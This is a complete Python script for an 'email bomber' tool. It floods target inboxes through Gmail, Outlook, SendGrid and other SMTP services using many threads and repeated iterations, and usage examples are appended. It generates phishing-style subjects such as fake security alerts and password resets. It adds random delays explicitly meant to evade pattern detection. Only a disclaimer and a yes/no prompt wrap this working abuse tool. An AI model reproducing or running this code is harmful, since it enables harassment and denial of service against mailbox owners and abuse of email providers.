#!/usr/bin/env python3
"""
Advanced Email Bomber Tool - For Educational and Authorized Testing Only
WARNING: Unauthorized use against email addresses you don't own is ILLEGAL
"""

import smtplib
import ssl
import time
import random
import threading
import argparse
import sys
import signal
import json
import logging
import re
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from typing import Dict, List, Tuple, Optional
import queue
from concurrent.futures import ThreadPoolExecutor
from wsgiref import validate
import requests
from bs4 import BeautifulSoup
import dns.resolver
import socket

# Configuration
MAX_THREADS = 50
DEFAULT_TIMEOUT = 30
MAX_EMAILS_PER_MINUTE = 60
RATE_LIMIT_WINDOW = 60  # seconds

class EmailProvider:
    """Email provider configuration"""
    
    PROVIDERS = {
        'gmail': {
            'smtp': 'smtp.gmail.com',
            'port': 587,
            'imap': 'imap.gmail.com',
            'requires_auth': True,
            'use_tls': True,
        },
        'outlook': {
            'smtp': 'smtp-mail.outlook.com',
            'port': 587,
            'imap': 'imap-mail.outlook.com',
            'requires_auth': True,
            'use_tls': True,
        },
        'yahoo': {
            'smtp': 'smtp.mail.yahoo.com',
            'port': 587,
            'imap': 'imap.mail.yahoo.com',
            'requires_auth': True,
            'use_tls': True,
        },
        'protonmail': {
            'smtp': 'mail.protonmail.ch',
            'port': 587,
            'imap': 'mail.protonmail.ch',
            'requires_auth': True,
            'use_tls': True,
        },
        'zoho': {
            'smtp': 'smtp.zoho.com',
            'port': 587,
            'imap': 'imap.zoho.com',
            'requires_auth': True,
            'use_tls': True,
        },
        'mailgun': {
            'smtp': 'smtp.mailgun.org',
            'port': 587,
            'requires_auth': True,
            'use_tls': True,
        },
        'sendgrid': {
            'smtp': 'smtp.sendgrid.net',
            'port': 587,
            'requires_auth': True,
            'use_tls': True,
        },
        'amazon_ses': {
            'smtp': 'email-smtp.us-east-1.amazonaws.com',
            'port': 587,
            'requires_auth': True,
            'use_tls': True,
        },
    }
    
    @classmethod
    def get_provider(cls, provider_name: str) -> Dict:
        """Get provider configuration"""
        return cls.PROVIDERS.get(provider_name.lower(), cls.PROVIDERS['gmail'])

class EmailGenerator:
    """Generate realistic email content"""
    
    SUBJECTS = [
        "Important: Action Required",
        "Your Account Status Update",
        "Security Alert: Unusual Activity",
        "Welcome to Our Service",
        "Payment Confirmation",
        "Order #{} Confirmation",
        "Your Subscription Details",
        "Upcoming Maintenance Notice",
        "Special Offer Just for You",
        "Your Feedback Matters",
        "Account Verification Required",
        "New Login Detected",
        "Password Reset Request",
        "Weekly Newsletter",
        "Exclusive Invitation",
        "Your Report is Ready",
        "System Update Notification",
        "Meeting Invitation",
        "Document Received",
        "Your Support Ticket Update",
    ]
    
    BODY_TEMPLATES = [
        """Dear User,

We hope this message finds you well. This is an important notification regarding your account.

Best regards,
Support Team""",
        
        """Hello,

This is a confirmation of your recent transaction. Please keep this for your records.

Thank you for your business,
Team""",
        
        """Important Security Notice,

We have detected unusual activity on your account. Please verify your identity.

Security Team""",
        
        """Greetings,

We're excited to share our latest updates with you. Check out what's new!

Best,
Marketing Team""",
    ]
    
    @classmethod
    def generate_subject(cls) -> str:
        """Generate random email subject"""
        subject = random.choice(cls.SUBJECTS)
        if '{}' in subject:
            subject = subject.format(random.randint(100000, 999999))
        return subject
    
    @classmethod
    def generate_body(cls) -> str:
        """Generate random email body"""
        template = random.choice(cls.BODY_TEMPLATES)
        
        # Add random content
        additional_text = """
        
        Additional Information:
        - Reference Number: REF-{ref}
        - Date: {date}
        - Status: {status}
        """.format(
            ref=random.randint(1000000, 9999999),
            date=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            status=random.choice(['Active', 'Pending', 'Complete', 'Processing'])
        )
        
        return template + additional_text
    
    @classmethod
    def generate_html_body(cls) -> str:
        """Generate HTML formatted email body"""
        return f"""
        <html>
            <body>
                <h2>{cls.generate_subject()}</h2>
                <p>{cls.generate_body().replace('\n', '<br>')}</p>
                <hr>
                <p><small>This is an automated message. Please do not reply.</small></p>
            </body>
        </html>
        """

class EmailValidator:
    """Validate and verify email addresses"""
    
    @staticmethod
    def validate_format(email: str) -> bool:
        """Validate email format using regex"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return bool(re.match(pattern, email))
    
    @staticmethod
    def validate_domain(email: str) -> bool:
        """Validate email domain exists"""
        try:
            domain = email.split('@')[1]
            dns.resolver.resolve(domain, 'MX')
            return True
        except:
            return False
    
    @staticmethod
    def validate_email_servers(email: str) -> bool:
        """Check if email servers are reachable"""
        try:
            domain = email.split('@')[1]
            # Try to connect to common mail servers
            for server in ['mail.' + domain, domain]:
                try:
                    socket.gethostbyname(server)
                    return True
                except:
                    continue
            return False
        except:
            return False
    
    @staticmethod
    def validate_email(email: str) -> Tuple[bool, str]:
        """Comprehensive email validation"""
        if not EmailValidator.validate_format(email):
            return False, "Invalid email format"
        
        if not EmailValidator.validate_domain(email):
            return False, "Domain does not exist or has no MX records"
        
        return True, "Valid email"

class RateLimiter:
    """Rate limiting mechanism"""
    
    def __init__(self, max_requests: int, time_window: int):
        self.max_requests = max_requests
        self.time_window = time_window
        self.requests = queue.Queue()
        self.lock = threading.Lock()
    
    def can_send(self) -> bool:
        """Check if we can send another email"""
        current_time = time.time()
        
        with self.lock:
            # Remove old requests
            while not self.requests.empty():
                if current_time - self.requests.queue[0] > self.time_window:
                    self.requests.get()
                else:
                    break
            
            if self.requests.qsize() < self.max_requests:
                self.requests.put(current_time)
                return True
            return False
    
    def wait_for_slot(self):
        """Wait until a slot becomes available"""
        while not self.can_send():
            time.sleep(0.5)

class EmailBomber:
    """Main Email Bomber class"""
    
    def __init__(self, sender_email: str, sender_password: str, 
                 provider: str = 'gmail', threads: int = 10,
                 emails_per_minute: int = 30):
        
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.provider = provider
        self.threads = min(threads, MAX_THREADS)
        self.emails_per_minute = min(emails_per_minute, MAX_EMAILS_PER_MINUTE)
        self.running = True
        self.stats = {
            'emails_sent': 0,
            'emails_failed': 0,
            'start_time': None,
            'end_time': None,
            'errors': [],
            'successful_sends': []
        }
        self.lock = threading.Lock()
        self.rate_limiter = RateLimiter(self.emails_per_minute, RATE_LIMIT_WINDOW)
        
        self.setup_logging()
        self.validate_sender()
        
    def setup_logging(self):
        """Configure logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('email_bomber.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def validate_sender(self):
        """Validate sender credentials"""
        if not EmailValidator.validate_email(self.sender_email):
            raise ValueError("Invalid sender email address")
        
        # Test connection
        try:
            provider_config = EmailProvider.get_provider(self.provider)
            self.test_connection(provider_config)
        except Exception as e:
            self.logger.warning(f"Sender validation warning: {e}")
            self.logger.info("Continuing anyway, but emails might fail to send")
    
    def test_connection(self, provider_config: Dict) -> bool:
        """Test SMTP connection"""
        try:
            context = ssl.create_default_context()
            server = smtplib.SMTP(provider_config['smtp'], provider_config['port'], timeout=10)
            
            if provider_config.get('use_tls', True):
                server.starttls(context=context)
            
            if provider_config.get('requires_auth', True):
                server.login(self.sender_email, self.sender_password)
            
            server.quit()
            self.logger.info("SMTP connection test successful")
            return True
            
        except Exception as e:
            self.logger.error(f"SMTP connection test failed: {e}")
            return False
    
    def create_email(self, recipient: str, subject: Optional[str] = None,
                    body: Optional[str] = None, html: bool = True,
                    attachments: List[str] = None) -> MIMEMultipart:
        """Create email message"""
        
        if not subject:
            subject = EmailGenerator.generate_subject()
        
        if not body:
            body = EmailGenerator.generate_body()
        
        msg = MIMEMultipart('alternative')
        msg['From'] = self.sender_email
        msg['To'] = recipient
        msg['Subject'] = subject
        
        # Add plain text part
        text_part = MIMEText(body, 'plain')
        msg.attach(text_part)
        
        # Add HTML part if requested
        if html:
            html_body = EmailGenerator.generate_html_body()
            html_part = MIMEText(html_body, 'html')
            msg.attach(html_part)
        
        # Add attachments
        if attachments:
            for file_path in attachments:
                try:
                    with open(file_path, 'rb') as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            'Content-Disposition',
                            f'attachment; filename="{file_path.split("/")[-1]}"'
                        )
                        msg.attach(part)
                except Exception as e:
                    self.logger.warning(f"Failed to attach {file_path}: {e}")
        
        return msg
    
    def send_email(self, recipient: str, subject: Optional[str] = None,
                  body: Optional[str] = None, html: bool = True,
                  attachments: List[str] = None) -> bool:
        """Send a single email"""
        
        # Validate recipient
        is_valid, message = EmailValidator.validate_email(recipient)
        if not is_valid:
            self.logger.warning(f"Invalid recipient {recipient}: {message}")
            with self.lock:
                self.stats['emails_failed'] += 1
            return False
        
        # Rate limiting
        self.rate_limiter.wait_for_slot()
        
        try:
            provider_config = EmailProvider.get_provider(self.provider)
            
            # Create email
            msg = self.create_email(recipient, subject, body, html, attachments)
            
            # Send email
            context = ssl.create_default_context()
            with smtplib.SMTP(provider_config['smtp'], provider_config['port'], timeout=DEFAULT_TIMEOUT) as server:
                if provider_config.get('use_tls', True):
                    server.starttls(context=context)
                
                if provider_config.get('requires_auth', True):
                    server.login(self.sender_email, self.sender_password)
                
                server.send_message(msg)
            
            # Update stats
            with self.lock:
                self.stats['emails_sent'] += 1
                self.stats['successful_sends'].append({
                    'recipient': recipient,
                    'timestamp': datetime.now().isoformat(),
                    'subject': subject
                })
            
            self.logger.info(f"Email sent to {recipient}")
            return True
            
        except smtplib.SMTPAuthenticationError:
            error_msg = "Authentication failed. Check your email/password."
            self.logger.error(error_msg)
            with self.lock:
                self.stats['emails_failed'] += 1
                self.stats['errors'].append(error_msg)
            return False
            
        except smtplib.SMTPRecipientsRefused:
            error_msg = f"Recipient {recipient} refused"
            self.logger.error(error_msg)
            with self.lock:
                self.stats['emails_failed'] += 1
                self.stats['errors'].append(error_msg)
            return False
            
        except smtplib.SMTPException as e:
            error_msg = f"SMTP error: {str(e)}"
            self.logger.error(error_msg)
            with self.lock:
                self.stats['emails_failed'] += 1
                if len(self.stats['errors']) < 100:
                    self.stats['errors'].append(error_msg)
            return False
            
        except Exception as e:
            error_msg = f"Unexpected error: {str(e)}"
            self.logger.error(error_msg)
            with self.lock:
                self.stats['emails_failed'] += 1
                if len(self.stats['errors']) < 100:
                    self.stats['errors'].append(error_msg)
            return False
    
    def bomb_worker(self, recipient_queue: queue.Queue, 
                   subject: Optional[str] = None,
                   body: Optional[str] = None,
                   html: bool = True,
                   attachments: List[str] = None):
        """Worker function for sending emails"""
        
        while self.running:
            try:
                recipient = recipient_queue.get_nowait()
            except queue.Empty:
                break
            
            self.send_email(recipient, subject, body, html, attachments)
            recipient_queue.task_done()
            
            # Small random delay to avoid pattern detection
            time.sleep(random.uniform(0.1, 0.5))
    
    def start_bombing(self, recipients: List[str], 
                     subject: Optional[str] = None,
                     body: Optional[str] = None,
                     html: bool = True,
                     attachments: List[str] = None,
                     iterations: int = 1,
                     delay_between: int = 0) -> Dict:
        """Start the email bombing process"""
        
        self.stats['start_time'] = datetime.now()
        self.logger.info(f"Starting email bombing campaign")
        self.logger.info(f"Recipients: {len(recipients)}")
        self.logger.info(f"Iterations: {iterations}")
        self.logger.info(f"Threads: {self.threads}")
        self.logger.info(f"Rate limit: {self.emails_per_minute} emails/minute")
        
        # Create queue with all recipient emails (repeat if iterations > 1)
        recipient_queue = queue.Queue()
        for i in range(iterations):
            for recipient in recipients:
                recipient_queue.put(recipient)
            if delay_between > 0 and i < iterations - 1:
                time.sleep(delay_between)
        
        total_emails = recipient_queue.qsize()
        self.logger.info(f"Total emails to send: {total_emails}")
        
        # Start threads
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(
                target=self.bomb_worker,
                args=(recipient_queue, subject, body, html, attachments)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Wait for completion
        recipient_queue.join()
        
        # Wait for threads to finish
        for thread in threads:
            thread.join(timeout=5)
        
        self.stats['end_time'] = datetime.now()
        self.running = False
        
        return self.stats
    
    def stop(self):
        """Stop the bombing process"""
        self.running = False
        self.logger.info("Stopping email bombing...")
    
    def print_stats(self):
        """Print current statistics"""
        elapsed = (self.stats['end_time'] - self.stats['start_time']).total_seconds() if self.stats['end_time'] else 0
        
        self.logger.info("\n" + "="*60)
        self.logger.info("EMAIL BOMBING STATISTICS")
        self.logger.info("="*60)
        self.logger.info(f"Total emails sent: {self.stats['emails_sent']}")
        self.logger.info(f"Total emails failed: {self.stats['emails_failed']}")
        self.logger.info(f"Success rate: {(self.stats['emails_sent'] / max(1, self.stats['emails_sent'] + self.stats['emails_failed']) * 100):.2f}%")
        self.logger.info(f"Time elapsed: {elapsed:.2f} seconds")
        self.logger.info(f"Emails per second: {self.stats['emails_sent'] / max(1, elapsed):.2f}")
        self.logger.info("="*60)
        
        if self.stats['errors']:
            self.logger.info("\nRecent errors (last 5):")
            for error in self.stats['errors'][-5:]:
                self.logger.info(f"  - {error}")
    
    def save_report(self):
        """Save bombing report to file"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'sender_email': self.sender_email,
            'provider': self.provider,
            'threads': self.threads,
            'emails_per_minute': self.emails_per_minute,
            'stats': {
                'emails_sent': self.stats['emails_sent'],
                'emails_failed': self.stats['emails_failed'],
                'start_time': self.stats['start_time'].isoformat() if self.stats['start_time'] else None,
                'end_time': self.stats['end_time'].isoformat() if self.stats['end_time'] else None,
            },
            'errors': self.stats['errors'][:10]  # First 10 errors
        }
        
        filename = f"email_bomb_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        self.logger.info(f"Report saved to {filename}")

def load_recipients_from_file(filename: str) -> List[str]:
    """Load recipients from file"""
    try:
        with open(filename, 'r') as f:
            recipients = [line.strip() for line in f if line.strip()]
        return recipients
    except Exception as e:
        print(f"Error reading file: {e}")
        return []

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\n\nEmail bombing interrupted by user")
    sys.exit(0)

def main():
    """Main function with argument parsing"""
    parser = argparse.ArgumentParser(
        description='Advanced Email Bomber Tool - For Educational Use Only',
        epilog='WARNING: Unauthorized use is illegal. Use only on email addresses you own.'
    )
    
    parser.add_argument('-r', '--recipients', nargs='+', help='List of recipient email addresses')
    parser.add_argument('-f', '--file', help='File containing recipient email addresses (one per line)')
    parser.add_argument('-s', '--sender', required=True, help='Sender email address')
    parser.add_argument('-p', '--password', required=True, help='Sender email password or app-specific password')
    parser.add_argument('-pr', '--provider', choices=list(EmailProvider.PROVIDERS.keys()),
                       default='gmail', help='Email provider')
    parser.add_argument('-t', '--threads', type=int, default=5,
                       help=f'Number of threads (max: {MAX_THREADS})')
    parser.add_argument('-rpm', '--emails-per-minute', type=int, default=30,
                       help=f'Maximum emails per minute (max: {MAX_EMAILS_PER_MINUTE})')
    parser.add_argument('-i', '--iterations', type=int, default=1,
                       help='Number of times to send to each recipient')
    parser.add_argument('-d', '--delay', type=int, default=0,
                       help='Delay between iterations in seconds')
    parser.add_argument('--subject', help='Custom email subject')
    parser.add_argument('--body', help='Custom email body')
    parser.add_argument('--no-html', action='store_true', 
                       help='Disable HTML email format')
    parser.add_argument('--attachments', nargs='+', 
                       help='Files to attach to emails')
    parser.add_argument('--validate', action='store_true',
                       help='Validate email addresses before sending')
    
    args = parser.parse_args()
    
    # Set signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Get recipients
    recipients = []
    if args.recipients:
        recipients.extend(args.recipients)
    if args.file:
        recipients.extend(load_recipients_from_file(args.file))
    
    if not recipients:
        print("Error: No recipients specified. Use -r or -f")
        sys.exit(1)
    
    # Validate recipients
    if args.validate:
        print("Validating email addresses...")
        valid_recipients = []
        for email in recipients:
            is_valid, message = EmailValidator.validate_email(email)
            if is_valid:
                valid_recipients.append(email)
            else:
                print(f"  Invalid: {email} - {message}")
        
        if not valid_recipients:
            print("No valid recipients found")
            sys.exit(1)
        
        recipients = valid_recipients
    
    # Remove duplicates
    recipients = list(set(recipients))
    print(f"Total unique recipients: {len(recipients)}")
    
    # Print banner
    print("\n" + "="*60)
    print("ADVANCED EMAIL BOMBER TOOL")
    print("FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY")
    print("="*60)
    print(f"Sender: {args.sender}")
    print(f"Provider: {args.provider}")
    print(f"Recipients: {len(recipients)}")
    print(f"Threads: {args.threads}")
    print(f"Emails/minute: {args.emails_per_minute}")
    print(f"Iterations: {args.iterations}")
    print("="*60 + "\n")
    
    # Confirm with user
    confirm = input("Are you sure you have permission to email these addresses? (yes/no): ")
    if confirm.lower() != 'yes':
        print("Operation cancelled.")
        sys.exit(0)
    
    try:
        # Create bomber instance
        bomber = EmailBomber(
            sender_email=args.sender,
            sender_password=args.password,
            provider=args.provider,
            threads=args.threads,
            emails_per_minute=args.emails_per_minute
        )
        
        # Start bombing
        stats = bomber.start_bombing(
            recipients=recipients,
            subject=args.subject,
            body=args.body,
            html=not args.no_html,
            attachments=args.attachments,
            iterations=args.iterations,
            delay_between=args.delay
        )
        
        # Print stats and save report
        bomber.print_stats()
        bomber.save_report()
        
    except KeyboardInterrupt:
        print("\nInterrupted by user")
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()


    #---------------------------------
# Basic usage - send to multiple recipients
#python email_bomber.py -s sender@gmail.com -p password -r recipient1@example.com recipient2@example.com

# Send from file with 10 threads
#python email_bomber.py -s sender@gmail.com -p password -f recipients.txt -t 10

# Multiple iterations with delay
#python email_bomber.py -s sender@gmail.com -p password -r test@example.com -i 5 -d 60

# Custom subject and body
#python email_bomber.py -s sender@gmail.com -p password -r test@example.com --subject "Custom Subject" --body "Custom Body"

# With attachments
#python email_bomber.py -s sender@gmail.com -p password -r test@example.com --attachments file1.pdf file2.jpg

# Validate emails before sending
#python email_bomber.py -s sender@gmail.com -p password -r test@example.com --validate

# Use different provider
#python email_bomber.py -s sender@outlook.com -p password -r test@example.com -pr outlook

